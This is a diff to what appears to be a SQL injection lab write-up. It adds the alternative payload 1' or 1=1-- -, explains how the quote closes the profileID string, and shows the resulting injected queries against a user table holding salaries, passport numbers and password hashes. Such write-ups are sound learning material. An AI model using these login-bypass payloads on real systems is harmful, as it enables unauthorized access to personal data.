@@ -30,10 +30,10 @@ As on the previous task, the same testing, without reading the guidance from try
 
 {{< figure src="/sql-injection-img/p2/ts2-testinput-1.png" width="100%">}}
 
-After examining the query result, I noticed that the `profileID` and `password` were both strings. Therefore, I attempted the injection **`1' or '1'='1'-- -`**. 
+After examining the query result, I noticed that the `profileID` and `password` were both strings. Therefore, I attempted the injection **`1' or '1'='1'-- -`** or can be **`1' or 1=1-- -`**. Here, `'1'='1'` or `1=1` is the same. Because the most inportant part is the `'` after the first `1` number in order to finish the string in the query `profileID = '...'`
 
 The result of inputed query:
-```query
+```sql
 SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID = '1' or '1'='1'-- -' AND password = 'a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3'
 ```
 
@@ -67,7 +67,7 @@ The login and the client-side validation can then easily be bypassed by going di
 
 The query I inputed **``1' or '1'='1'-- -``** is the same as in task 2.
 
-```query
+```sql
 SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID='1' or '1'='1'-- -' AND password='a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3'
 ```
 
